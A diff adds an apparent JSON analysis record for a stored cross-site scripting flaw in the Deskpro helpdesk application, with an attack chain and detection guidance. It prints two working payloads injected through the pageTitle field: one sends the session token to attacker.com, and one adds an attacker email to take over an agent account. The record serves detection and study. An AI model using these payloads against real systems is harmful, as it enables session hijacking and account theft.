@@ -1,0 +1,110 @@
+{
+  "package_info": {
+    "package_name": "Deskpro",
+    "package_manager": "N/A (proprietary web application)",
+    "package_versions": "2020.2.9 (Docker and Cloud), likely earlier versions as well",
+    "why_malicious": "The Deskpro application contains a stored cross-site scripting (XSS) vulnerability that allows attackers to inject and execute arbitrary JavaScript in the browser context of admins and agents. This enables session hijacking, privilege escalation, and account takeover, resulting in full compromise of helpdesk data and configuration."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "user activity tracking (runtime, upon page visit)",
+        "file_location": "Request payload to /portal/api/auth/session endpoint (meta.pageTitle property)",
+        "required_permissions": [
+          "network",
+          "browser DOM access"
+        ]
+      },
+      "code_snippet": "<script>fetch('https://attacker.com/steal?token='+DESKPRO_SESSION_CODE)</script>",
+      "code_language": "javascript",
+      "code_behavior": "When an admin or agent loads the 'Ticket Insights' dashboard, the code executes in the browser context, accesses the DESKPRO_SESSION_CODE global variable, and sends its value to an attacker-controlled domain via an HTTP request, enabling session hijacking.",
+      "malice_analysis": {
+        "why_suspicious": "The code exfiltrates a session token to an external server, which is a classic sign of credential theft.",
+        "violated_expectations": "User-supplied data (pageTitle) should never be executed as code in the browser; it should be treated as plain text and properly escaped.",
+        "similar_legitimate_use": "Legitimate analytics scripts may collect page titles, but never execute them as code or exfiltrate session tokens.",
+        "key_indicators": [
+          "Direct access to global session variable in the DOM",
+          "Exfiltration of sensitive data to an external domain",
+          "Execution of user-supplied data as JavaScript"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "user activity tracking (runtime, upon page visit)",
+        "file_location": "Request payload to /portal/api/auth/session endpoint (meta.pageTitle property)",
+        "required_permissions": [
+          "network",
+          "browser DOM access"
+        ]
+      },
+      "code_snippet": "<script>fetch('/agent/account/emails/add', {method:'POST',body:'email=attacker@somehost.com&_rt='+DP_REQUEST_TOKEN,headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>",
+      "code_language": "javascript",
+      "code_behavior": "When an agent loads the 'Ticket Insights' dashboard, the code executes in the browser context, retrieves the DP_REQUEST_TOKEN from the DOM, and sends a POST request to add the attacker's email address to the agent's account, enabling account takeover.",
+      "malice_analysis": {
+        "why_suspicious": "The code performs an unauthorized account modification by adding a new email address without user consent.",
+        "violated_expectations": "User-supplied data should not be executed as code, nor should it be able to trigger sensitive account changes without re-authentication.",
+        "similar_legitimate_use": "Automated account management scripts may update emails, but only after proper authentication and user interaction.",
+        "key_indicators": [
+          "Use of request token from DOM for CSRF-like attack",
+          "Silent modification of account settings",
+          "Execution of user-supplied data as JavaScript"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a malicious payload in the pageTitle property of the meta object and sends it to the /portal/api/auth/session endpoint.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Payload is stored in the Deskpro database and rendered in dashboards."
+    },
+    {
+      "step": 2,
+      "action": "Admin or agent opens the 'Ticket Insights' dashboard, triggering the stored XSS payload to execute in their browser context.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious JavaScript executes with the victim's privileges."
+    },
+    {
+      "step": 3,
+      "action": "For admin session hijacking: The script exfiltrates the DESKPRO_SESSION_CODE to the attacker's server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker hijacks the admin session and gains full system access."
+    },
+    {
+      "step": 4,
+      "action": "For agent account takeover: The script adds the attacker's email to the agent's account using the DP_REQUEST_TOKEN.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker initiates password reset and takes over the agent's account."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Execution of user-supplied data as JavaScript in dashboards",
+      "Unexpected network requests to external domains from admin/agent dashboards",
+      "Silent modification of account email addresses via background requests"
+    ],
+    "file_indicators": [
+      "Unescaped or unencoded user input rendered in dashboard widgets (e.g., Top KB Views)",
+      "Presence of <script> tags or suspicious JavaScript in pageTitle or similar fields in the database"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/HTTPS requests to unknown or attacker-controlled domains from Deskpro admin/agent sessions",
+      "Unusual POST requests to /agent/account/emails/add originating from dashboard pages"
+    ],
+    "how_to_detect": "Monitor for script execution in dashboard widgets, especially where user-supplied data is rendered. Inspect network traffic from admin and agent sessions for requests to external domains or unauthorized internal API calls (such as adding emails). Audit database fields for embedded <script> tags or suspicious JavaScript. Implement Content Security Policy (CSP) with nonces to block inline scripts, and enforce output encoding/escaping for all user-supplied data."
+  }
+}
